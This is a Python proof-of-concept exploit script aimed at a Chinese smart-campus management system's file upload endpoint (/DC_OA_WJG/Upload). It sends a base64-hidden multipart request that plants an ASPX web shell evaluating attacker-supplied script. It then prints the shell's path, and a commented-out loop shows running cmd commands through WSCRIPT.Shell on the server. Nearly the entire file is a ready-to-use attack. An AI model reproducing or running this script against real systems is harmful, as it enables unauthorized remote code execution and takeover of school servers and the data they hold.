#!/usr/bin/python
# Env: python3
# Author: PeiQi0
# Rewrite: afei_0and1
# -*- coding: utf8 -*-

import requests, sys, re, base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------------------------------------')
    print(" ")
    print("Version: 智慧校园管理系统")
    print("POC_Des: http://wiki.peiqi.tech ")
    print("CSDN: https://blog.csdn.net/qq_41490561")
    print("公众号：网络运维渗透")
    print(" ")

def general_School_system_POC():
    print('+------------------------------------------------------------------------')
    print(" ")
    print("Useg: python %s url" % sys.argv[0])
    print("eg: python general_School_system_POC.py http://x.x.x.x:xxxx")
    print(" ")
    print('+------------------------------------------------------------------------')
    target_url = sys.argv[1]
    
    vuln_url = target_url + "/DC_OA_WJG/Upload"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryNxqOHxbHqt9mf7s5",
    }
    data = base64.b64decode("LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5TnhxT0h4YkhxdDltZjdzNQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InVwRmlsZSI7IGZpbGVuYW1lPSJjb25uLmFzcHgiCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vb2N0ZXQtc3RyZWFtCgo8c2NyaXB0IGxhbmd1YWdlPSJKU2NyaXB0IiBydW5hdD0ic2VydmVyIj5mdW5jdGlvbiBQYWdlX0xvYWQoKXtldmFsKFJlcXVlc3RbImFmZWljb21lIl0sInVuc2FmZSIpO308L3NjcmlwdD4KCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeU54cU9IeGJIcXQ5bWY3czUtLQ==")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print(response)
        print("\033[36m[o] 正在请求 {}/DC_OA_WJG/Upload 尝试上传木马..... \033[0m".format(target_url))
        if 'true' in response.text and 'path' in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 成功上传 Webshell文件\033[0m".format(target_url))
            webshell_path = re.findall(r'"path":"(.*?)"', response.text)[0]
            print("\033[32m[o] Webshell文件地址: {}/{} \033[0m".format(target_url, webshell_path))
            '''
            while True:
                Cmd = str(input("\033[35mCmd >>> \033[0m"))
                cmd_url = target_url + "/" + webshell_path + "?PeiQi=Response.Write(new%20ActiveXObject(%22WSCRIPT.Shell%22).exec(%22cmd%20/c%20{}%22).StdOut.ReadAll());".format()
                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                response = requests.get(url=cmd_url, data=data, headers=headers, verify=False, timeout=5)
                print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
                sys.exit(0)
            ''' 
        else:
            print("\033[31m[x] 目标 {} 上传Webshell文件失败\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    #target_url = str(input("Please input Attack Url\nUrl："))
    #general_School_system_POC(target_url)
    title()
    try:
        general_School_system_POC()
    except IndexError:
        print('请参考用法！')